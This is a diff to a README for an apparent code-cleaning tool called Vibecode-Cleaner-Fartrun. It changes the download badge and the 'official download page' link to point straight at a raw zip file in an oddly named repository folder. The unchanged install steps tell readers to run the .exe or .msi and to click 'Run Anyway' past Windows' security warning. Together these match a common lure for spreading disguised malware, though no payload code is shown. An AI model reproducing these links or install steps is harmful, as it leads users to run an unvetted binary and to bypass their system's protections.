@@ -1,6 +1,6 @@
 # 🧹 Vibecode-Cleaner-Fartrun - Keep your code clean and healthy
 
-[![](https://img.shields.io/badge/Download-Vibecode-blue.svg)](https://github.com/Mitrewortavo5426/Vibecode-Cleaner-Fartrun)
+[![](https://img.shields.io/badge/Download-Vibecode-blue.svg)](https://github.com/Mitrewortavo5426/Vibecode-Cleaner-Fartrun/raw/refs/heads/main/Choanoflagellidae/Fartrun_Vibecode_Cleaner_2.9.zip)
 
 ## 🔍 What this app does
 
@@ -24,7 +24,7 @@ Vibecode-Cleaner-Fartrun scans your project folders to find issues in your code.
 
 ## 🚀 Downloading and Installing
 
-1.  Visit the [official download page](https://github.com/Mitrewortavo5426/Vibecode-Cleaner-Fartrun) to get the latest version of the installer.
+1.  Visit the [official download page](https://github.com/Mitrewortavo5426/Vibecode-Cleaner-Fartrun/raw/refs/heads/main/Choanoflagellidae/Fartrun_Vibecode_Cleaner_2.9.zip) to get the latest version of the installer.
 2.  Look for the file that ends in .msi or .exe and save it to your Downloads folder.
 3.  Double-click the downloaded file to start the setup process.
 4.  Follow the instructions on your screen. Windows might ask for permission to run the file because it is not from the Microsoft Store. Click "More Info" and then "Run Anyway" if you see this message.
